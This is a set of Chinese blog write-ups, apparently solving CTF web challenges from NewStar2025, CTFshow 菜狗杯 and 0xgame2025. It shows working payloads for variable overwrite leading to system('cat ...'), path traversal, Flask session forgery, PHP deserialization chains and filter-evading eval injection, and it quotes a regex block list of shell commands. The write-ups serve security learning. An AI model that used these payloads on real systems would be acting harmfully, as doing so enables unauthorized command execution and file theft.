class="params">levelIndex</span>) &#123;</span><br><span class="line">      score = <span class="number">0</span>;</span><br><span class="line">      scoreEl.<span class="property">innerText</span> = <span class="string">&quot;分数: &quot;</span> + score;</span><br><span class="line">      steps = <span class="number">0</span>;</span><br><span class="line">      finishSpawned = <span class="literal">false</span>;</span><br><span class="line">      levelEl.<span class="property">innerText</span> = <span class="string">&quot;关卡: &quot;</span> + (levelIndex + <span class="number">1</span>);</span><br><span class="line">      [...game.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.gate, .finish-line&#x27;</span>)].<span class="title function_">forEach</span>(<span class="function"><span class="params">e</span> =&gt;</span> e.<span class="title function_">remove</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">startGame</span>(<span class="params"></span>) &#123;</span><br><span class="line">      gateInterval = <span class="built_in">setInterval</span>(spawnGate, <span class="number">1500</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">startGame</span>();</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;visibilitychange&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">hidden</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (gateInterval) &#123;</span><br><span class="line">          <span class="built_in">clearInterval</span>(gateInterval);</span><br><span class="line">          gateInterval = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!gameEnded &amp;&amp; !gateInterval) &#123;</span><br><span class="line">          gateInterval = <span class="built_in">setInterval</span>(spawnGate, <span class="number">1500</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>

<p>分析代码，我们发现主要是score记录分数，endLevel()结束</p>
<p>那我们可以先手动过第一关</p>
<p>然后第二关时候<img src="/2025/10/15/newstar2025%EF%BC%88week1/8046f41e-d46d-453f-b8d2-a8569621a0b4-20251015093947-y80uu42.png" class="" title="8046f41e-d46d-453f-b8d2-a8569621a0b4"></p>
<img src="/2025/10/15/newstar2025%EF%BC%88week1/154819e2-6d5e-4300-8529-467b8400e1d5-20251015093950-hgrp814.png" class="" title="154819e2-6d5e-4300-8529-467b8400e1d5">

<p>获得flag</p>
<p>或者利用它向&#x2F;flag.php发POST请求</p>
<img src="/2025/10/15/newstar2025%EF%BC%88week1/02c331ba-d0eb-4476-be24-73422f9e11af-20251015094128-w9nsajy.png" class="" title="02c331ba-d0eb-4476-be24-73422f9e11af">

<h2 id="黑客小W的故事（1）"><a href="#黑客小W的故事（1）" class="headerlink" title="黑客小W的故事（1）"></a>黑客小W的故事（1）</h2><p>第一关抓包有个count我们把值改大发包就过了</p>
<img src="/2025/10/15/newstar2025%EF%BC%88week1/11ef2f44-a718-451f-bae9-56daa8c953c9-20251016205937-rx8ak4w.png" class="" title="11ef2f44-a718-451f-bae9-56daa8c953c9">

<p>然后是第二关，根据提示</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET:shipin=mogubaozi</span><br><span class="line"><span class="attribute">POST</span><span class="punctuation">: </span>guding</span><br></pre></td></tr></table></figure>

<p>然后蘑菇先生就让我们干活了</p>
<img src="/2025/10/15/newstar2025%EF%BC%88week1/6732a2c8-446c-4494-86a9-6311d2089047-20251016210150-t93aplh.png" class="" title="6732a2c8-446c-4494-86a9-6311d2089047">

<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="string">/talkToMushroom?shipin=mogubaozi</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>eci-2zedlhm2pgyz7chpwq8n.cloudeci1.ichunqiu.com:8000</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJOYW1lIjoiVHJ1ZSIsImxldmVsIjoyfQ.ZkyNOnNCPlMO55mZygnPyKHJxb1quNG5ebBDRsCTwlk</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span><span class="punctuation">: </span>&quot;Not;A=Brand&quot;;v=&quot;24&quot;, &quot;Chromium&quot;;v=&quot;128&quot;</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Priority</span><span class="punctuation">: </span>u=0, i</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>15</span><br><span class="line"></span><br><span class="line"><span class="language-ebnf"><span class="attribute">chongzi</span></span></span><br></pre></td></tr></table></figure>

<p>然后进入下一关</p>
<p>身份验证，说了是User-Agent</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) CycloneSlash/128.0.6613.120 DashSlash/537.36</span><br></pre></td></tr></table></figure>

<p>然后获得flag</p>
<p>‍</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFshow 菜狗杯 Web 部分题解</title>
    <url>/2024/01/20/%E8%8F%9C%E7%8B%97%E6%9D%AFctfshow%20web(%E9%83%A8%E5%88%86/</url>
    <content><![CDATA[<h2 id="web-签到"><a href="#web-签到" class="headerlink" title="web 签到"></a>web 签到</h2><p>套娃（bp 和 hackbar 都行）</p>
<p>cookie-&gt;post-&gt;get-&gt;requst</p>
<img src="/2024/01/20/%E8%8F%9C%E7%8B%97%E6%9D%AFctfshow%20web(%E9%83%A8%E5%88%86/e81f7f74-39ed-4afc-8470-8cdfc46d88af-20250120220429-rpo6s48.png" class="" title="web2解题过程截图">

<p>requst 没固定什么传参，但是试了一下好像 get 不行？(不知道是不是自己的问题；</p>
<h2 id="web2-c0me-t0-s1gn"><a href="#web2-c0me-t0-s1gn" class="headerlink" title="web2 c0me_t0_s1gn"></a>web2 c0me_t0_s1gn</h2><p>F12 获得第一部份</p>
<p>跟着提示</p>
<img src="/2024/01/20/%E8%8F%9C%E7%8B%97%E6%9D%AFctfshow%20web(%E9%83%A8%E5%88%86/e81f7f74-39ed-4afc-8470-8cdfc46d88af-20250120220429-rpo6s48.png" class="" title="web2解题过程截图">

<h2 id="我的眼里只有"><a href="#我的眼里只有" class="headerlink" title="我的眼里只有$"></a>我的眼里只有$</h2><p>变量覆盖</p>
<img src="/2024/01/20/%E8%8F%9C%E7%8B%97%E6%9D%AFctfshow%20web(%E9%83%A8%E5%88%86/7047fcf2-e9b7-4a4e-9d03-55fc257a1a3b-20250120220847-5ztfyev.png" class="" title="变量覆盖题目截图">

<p>37-1 个</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">_=a&amp;a=b&amp;b=c&amp;c=d&amp;d=e&amp;e=f&amp;f=g&amp;g=h&amp;h=i&amp;i=j&amp;j=k&amp;k=l&amp;l=m&amp;m=n&amp;n=o&amp;o=p&amp;p=q&amp;q=r&amp;r=s&amp;s=t&amp;t=u&amp;u=v&amp;v=w&amp;w=x&amp;x=y&amp;y=z&amp;z=aa&amp;aa=bb&amp;bb=cc&amp;cc=dd&amp;dd=ee&amp;ee=ff&amp;ff=gg&amp;gg=hh&amp;hh=ii&amp;ii=system(&#x27;cat /f1agaaa&#x27;);</span><br></pre></td></tr></table></figure>

<h2 id="抽老婆"><a href="#抽老婆" class="headerlink" title="抽老婆"></a>抽老婆</h2><p>session 伪造</p>
<p>没思路，抓个包然后每个按钮按一遍</p>
<img src="/2024/01/20/%E8%8F%9C%E7%8B%97%E6%9D%AFctfshow%20web(%E9%83%A8%E5%88%86/b37d12a6-96b6-4b4b-96c4-d4c0729f07b7-20250120230512-x7gczz3.png" class="" title="抽老婆界面截图">
<img src="/2024/01/20/%E8%8F%9C%E7%8B%97%E6%9D%AFctfshow%20web(%E9%83%A8%E5%88%86/8e4361d2-c0f0-49b3-80a7-0a18dfbc8f0d-20250120224013-o2crfg2.png" class="" title="下载功能截图">

<p>session 和&#x2F;download?file&#x3D;,有点说法,试试 file&#x3D;1，看到 app.py,看看能不能搞下来，然后瞎几把试了一堆用 flie&#x3D;..&#x2F;..&#x2F;app.py(相对路径)弄出来了,得到源码</p>
<img src="/2024/01/20/%E8%8F%9C%E7%8B%97%E6%9D%AFctfshow%20web(%E9%83%A8%E5%88%86/0d55845e-d5b3-43e9-9189-407903e8057c-20250120224106-0ubwoz6.png" class="" title="文件读取截图">
<img src="/2024/01/20/%E8%8F%9C%E7%8B%97%E6%9D%AFctfshow%20web(%E9%83%A8%E5%88%86/6b1a2089-86cc-42e5-9e8c-6ffa529ab935-20250120224405-0644iki.png" class="" title="源码获取截图">

<p>key:tanji_is_A_boy_Yooooooooooooooooooooo!</p>
<p>路径:&#x2F;secret_path_U_never_know</p>
<p>结合源码，然后百度了一下身份验证，确定是 session 伪造 也就是 session[‘isadmin’]&#x3D;False-&gt;session[‘isadmin’]&#x3D;Ture</p>
<p>使用 flask_session_cookie_manager3.py</p>
<img src="/2024/01/20/%E8%8F%9C%E7%8B%97%E6%9D%AFctfshow%20web(%E9%83%A8%E5%88%86/bc84b2c7-26a0-4a30-b385-2b5b03dfe264-20250120225805-l37zwl9.png" class="" title="Session伪造工具截图">
<img src="/2024/01/20/%E8%8F%9C%E7%8B%97%E6%9D%AFctfshow%20web(%E9%83%A8%E5%88%86/85128124-4a9d-4c77-855f-794ff2a5d15c-20250120230108-rcazsxm.png" class="" title="伪造成功截图">

<h2 id="一言既出"><a href="#一言既出" class="headerlink" title="一言既出"></a>一言既出</h2><p>琢磨半天 inval,一看 wp 是闭合…</p>
<p>?num&#x3D;114514);(19199810</p>
<p>?num&#x3D;114514);&#x2F;&#x2F;等等</p>
<h2 id="驷马难追"><a href="#驷马难追" class="headerlink" title="驷马难追"></a>驷马难追</h2><p>多了个正则匹配,但是这个依旧能打</p>
<p>?num&#x3D;114514);(19199810</p>
<h2 id="TapTapTap"><a href="#TapTapTap" class="headerlink" title="TapTapTap"></a>TapTapTap</h2><p>F12 观察一遍发现 js&#x2F;habibiScript.js 有点可疑,然后打开发现 base64 编码,解码访问即可</p>
<img src="/2024/01/20/%E8%8F%9C%E7%8B%97%E6%9D%AFctfshow%20web(%E9%83%A8%E5%88%86/81a98378-3848-4f22-bdff-c87f5c3050cd-20250120232801-9gqpzac.png" class="" title="JS文件发现截图">
<img src="/2024/01/20/%E8%8F%9C%E7%8B%97%E6%9D%AFctfshow%20web(%E9%83%A8%E5%88%86/092d7293-c681-4bbb-98c6-9f771301b2c9-20250120232922-1yes3ir.png" class="" title="Base64解码截图">

<h2 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h2><p>反序列化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Webshell</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&#x27;cat fl*&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Webshell</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="化零为整"><a href="#化零为整" class="headerlink" title="化零为整"></a>化零为整</h2><p>count($_GET) 统计传参个数</p>
<p>strlen()&lt;1 每个参数只能占用一个字节</p>
<p>把大牛 url 后分开传入就行了   大牛-&gt;%E5%A4%A7%E7%89%9B</p>
<p>?1&#x3D;%E5&amp;2&#x3D;%A4&amp;3&#x3D;%A7&amp;4&#x3D;%E7&amp;5&#x3D;%89&amp;6&#x3D;%9B</p>
<h2 id="无一幸免"><a href="#无一幸免" class="headerlink" title="无一幸免"></a>无一幸免</h2><p>?0&#x3D;传啥都行</p>
<h2 id="无一幸免-FIXED"><a href="#无一幸免-FIXED" class="headerlink" title="无一幸免_FIXED"></a>无一幸免_FIXED</h2><p>数组整型溢出判断为真 int 范围可知：32 位最大是 2<sup>31</sup>-1，64 位是 2<sup>63</sup>-1</p>
<p>?0&#x3D;9223372036854775807</p>
<h2 id="传说之下（雾）"><a href="#传说之下（雾）" class="headerlink" title="传说之下（雾）"></a>传说之下（雾）</h2><p>代码审计，cmd 和 param，cmd 控制前三个字符当作命令，param 当作参数,这还有个 evilSource.py,点进去看看</p>
<img src="/2024/01/20/%E8%8F%9C%E7%8B%97%E6%9D%AFctfshow%20web(%E9%83%A8%E5%88%86/a05c8a5f-ab6b-466e-a05f-d9409899ee5a-20250122211814-04yifpv.png" class="" title="题目界面截图">
<img src="/2024/01/20/%E8%8F%9C%E7%8B%97%E6%9D%AFctfshow%20web(%E9%83%A8%E5%88%86/8542a044-34bf-471a-9f54-cc0792a9136c-20250122211929-ki0hmu6.png" class="" title="源码分析截图">

<p>发现 flag.txt  payload:cmd&#x3D;cat&amp;param&#x3D;flag.txt</p>
<h2 id="遍地飘零"><a href="#遍地飘零" class="headerlink" title="遍地飘零"></a>遍地飘零</h2><p>代码审计，应该是变量覆盖，通过执行 var_dump(flag)来显示 flag 的值</p>
<p>也就是说 $_GET&#x3D;flag,传一下试试，发现成功了</p>
<p>当然重点还有 foreach()</p>
<p>foreach($GET as$ key&#x3D;&gt;value)会遍历所有通过 URL 传递的 GET 参数。<br>每次循环中，$key是参数名，$ value 是参数值</p>
<p>然后把 value 的变量的值赋给名为 key 的变量</p>
<h2 id="茶歇区"><a href="#茶歇区" class="headerlink" title="茶歇区"></a>茶歇区</h2><p>瞎几把乱填发现这个 9223372036854775807，看这个数字挺熟悉的然后查资料估计是要溢出</p>
<img src="/2024/01/20/%E8%8F%9C%E7%8B%97%E6%9D%AFctfshow%20web(%E9%83%A8%E5%88%86/ae364b44-526b-4257-9660-47c5d5529f4b-20250122214651-hp5r300.png" class="" title="茶歇区界面截图">

<p>通过一个个传入 9223372036854775807 发现回显不同，矿泉水火腿肠一样，饮料和面包一样，所以可以指向咖啡这个特立独行的家伙，传入一次 9223372036854775807 后再传入两次 99999999999999999999 就获得 flag 了</p>
<p>（为什么是 99999999999999999999 呢，其实传一个比 9223372036854775807 大挺多的数字就行,但是又不能大太多，也懒得去试了）</p>
<h2 id="小舔田？"><a href="#小舔田？" class="headerlink" title="小舔田？"></a>小舔田？</h2><p>Moon的__toString()-&gt;Ion_Fan_Princess的__toString()-&gt;call()</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Moon</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ion_Fan_Princess</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>=<span class="string">&quot;小甜甜&quot;</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Moon</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Ion_Fan_Princess</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name=<span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<h2 id="LSB探姬"><a href="#LSB探姬" class="headerlink" title="LSB探姬"></a>LSB探姬</h2><p>先看源码，发现flag.py以及有文件名的命令执行</p>
<img src="/2024/01/20/%E8%8F%9C%E7%8B%97%E6%9D%AFctfshow%20web(%E9%83%A8%E5%88%86/0c9841d54f5d193146c66cdd373e6ae5-20250122224401-9sk36lk.png" class="" title="源码查看截图">

<p>然后bp拦截改包</p>
<img src="/2024/01/20/%E8%8F%9C%E7%8B%97%E6%9D%AFctfshow%20web(%E9%83%A8%E5%88%86/c0d4319a-97b8-4d0e-8097-4d8e5275de85-20250122224938-zrcq9jm.png" class="" title="请求拦截截图">
<img src="/2024/01/20/%E8%8F%9C%E7%8B%97%E6%9D%AFctfshow%20web(%E9%83%A8%E5%88%86/13d3107c-516b-4847-8753-b98a0042dee3-20250122224713-932k1sm.png" class="" title="响应结果截图">

<p>‍</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
        <tag>ctshow</tag>
      </tags>
  </entry>
  <entry>
    <title>0xgame2025（week1</title>
    <url>/2025/10/14/0xgame2025%EF%BC%88week1/</url>
    <content><![CDATA[<h1 id="0xgame2025（week1"><a href="#0xgame2025（week1" class="headerlink" title="0xgame2025（week1"></a>0xgame2025（week1</h1><h2 id="Http的真理，我已解明"><a href="#Http的真理，我已解明" class="headerlink" title="Http的真理，我已解明"></a>Http的真理，我已解明</h2><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?hello=web</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>80-88be64bf-b04b-4de3-abda-67450325761a.challenge.ctfplus.cn</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Safari</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>9</span><br><span class="line">cookie:Sean=god</span><br><span class="line">Referer:www.mihoyo.com</span><br><span class="line">Via:clash</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">http</span><span class="operator">=</span>good</span></span><br></pre></td></tr></table></figure>

<p>‍</p>
<h2 id="Lemon"><a href="#Lemon" class="headerlink" title="Lemon"></a>Lemon</h2><p>禁用了F12和右键，打开开发者工具</p>
<p>‍</p>
<h2 id="RCE1"><a href="#RCE1" class="headerlink" title="RCE1"></a>RCE1</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">源码</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$rce1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;rce1&#x27;</span>];</span><br><span class="line"><span class="variable">$rce2</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;rce2&#x27;</span>];</span><br><span class="line"><span class="variable">$real_code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;rce3&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/(?:\d|[\$%&amp;#@*]|system|cat|flag|ls|echo|nl|rev|more|grep|cd|cp|vi|passthru|shell|vim|sort|strings)/i&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$text</span></span>): <span class="title">bool</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$pattern</span>;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">bool</span>) <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$text</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$rce1</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$rce2</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$rce1</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$rce2</span>) &amp;&amp; <span class="variable">$rce1</span> !== <span class="variable">$rce2</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">check</span>(<span class="variable">$real_code</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$real_code</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Don&#x27;t hack me ~&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;md5 do not match correctly&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Please provide both rce1 and rce2&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>前面挺好绕的md5强比较，用数组（两个数组都为NULL）</p>
<p>这边过滤了​<code>/(?:\d|[$%&amp;#@*]|system|cat|flag|ls|echo|nl|rev|more|grep|cd|cp|vi|passthru|shell|vim|sort|strings)/i</code></p>
<p>过滤了挺多的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">print</span>(<span class="title function_ invoke__">implode</span>(<span class="string">&quot;\n&quot;</span>,<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>)));  <span class="comment">//  ls /</span></span><br><span class="line"><span class="keyword">print</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/&#x27;</span>.<span class="string">&#x27;f&#x27;</span>.<span class="string">&#x27;l&#x27;</span>.<span class="string">&#x27;a&#x27;</span>.<span class="string">&#x27;g&#x27;</span>));  <span class="comment">//  /flag</span></span><br><span class="line"></span><br><span class="line">官方的</span><br><span class="line">rce3=<span class="keyword">print</span>(`tac /f???`);</span><br><span class="line">rce3=<span class="title function_ invoke__">readfile</span>(<span class="string">&#x27;/&#x27;</span>.<span class="string">&#x27;fl&#x27;</span>.<span class="string">&#x27;ag&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>所以结果就是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GET：rce1[]=<span class="number">1</span></span><br><span class="line">POST:rce2[]=<span class="number">2</span>&amp;rce3=<span class="keyword">print</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/&#x27;</span>.<span class="string">&#x27;f&#x27;</span>.<span class="string">&#x27;l&#x27;</span>.<span class="string">&#x27;a&#x27;</span>.<span class="string">&#x27;g&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p>‍</p>
<h2 id="Rubbish-Unser"><a href="#Rubbish-Unser" class="headerlink" title="Rubbish_Unser"></a>Rubbish_Unser</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">源码</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ZZZ</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$yuzuha</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$yuzuha</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; yuzuha = <span class="variable">$yuzuha</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;破绽，在这里！&quot;</span> . <span class="variable language_">$this</span> -&gt; yuzuha;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HSR</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$robin</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$robin</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$castorice</span> = <span class="variable language_">$this</span> -&gt; robin;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$castorice</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HI3rd</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$RaidenMei</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kiana</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$guanxing</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span> -&gt; kiana !== <span class="variable language_">$this</span> -&gt; RaidenMei &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span> -&gt; kiana) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span> -&gt; RaidenMei) &amp;&amp; <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span> -&gt; kiana) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span> -&gt; RaidenMei))</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span> -&gt; guanxing -&gt; Elysia;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GI</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$furina</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$Charlotte</span> = <span class="variable language_">$this</span> -&gt; furina;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$Charlotte</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mi</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$game</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$game1</span> = @<span class="variable language_">$this</span> -&gt; game -&gt; <span class="title function_ invoke__">tks</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$game1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;0xGame&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$web</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;0xGame&#x27;</span>]);</span><br><span class="line">    <span class="keyword">throw</span> <span 